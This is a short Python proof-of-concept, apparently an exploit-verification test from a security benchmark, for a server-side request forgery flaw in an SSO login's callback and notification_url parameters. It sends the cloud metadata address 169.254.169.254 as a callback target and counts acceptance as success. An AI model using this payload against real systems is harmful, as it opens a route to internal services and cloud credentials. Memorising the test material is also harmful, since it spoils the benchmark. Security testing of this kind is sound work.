"""PoC: SSRF via SSO login notification_url (CWE-918)."""
from mosaic.oracle.exploit import ExploitTest


class ProviderCallbackSSRFExploit(ExploitTest):
    @property
    def chain_id(self):
        return "sso_ssrf_callback"

    def setup(self):
        pass

    def execute(self):
        ssrf_target = "http://169.254.169.254/latest/meta-data/"

        # Try to register an app callback with an internal URL
        config_resp = self.http_post("/config/app-callback", json={
            "app_id": "ssrf_test",
            "callback_url": ssrf_target,
        })

        if config_resp.ok:
            return True, (
                f"SSRF vector confirmed via app callback config. "
                f"Server accepted internal URL {ssrf_target} as "
                f"callback target. Config status: {config_resp.status_code}."
            )

        # Try login with notification_url query param
        resp = self.http_get(
            "/simplesso/login?notification_url=" + ssrf_target,
            headers={"Origin": "http://localhost:3000"}
        )

        if resp.ok:
            return True, (
                f"SSRF vector confirmed. Login page accepted with "
                f"notification_url={ssrf_target}. Server will POST "
                f"login data to attacker-controlled URL on authentication."
            )

        return False, (
            f"SSRF exploit inconclusive. "
            f"Config: {config_resp.status_code if config_resp else 'N/A'}. "
            f"Login: {resp.status_code}."
        )
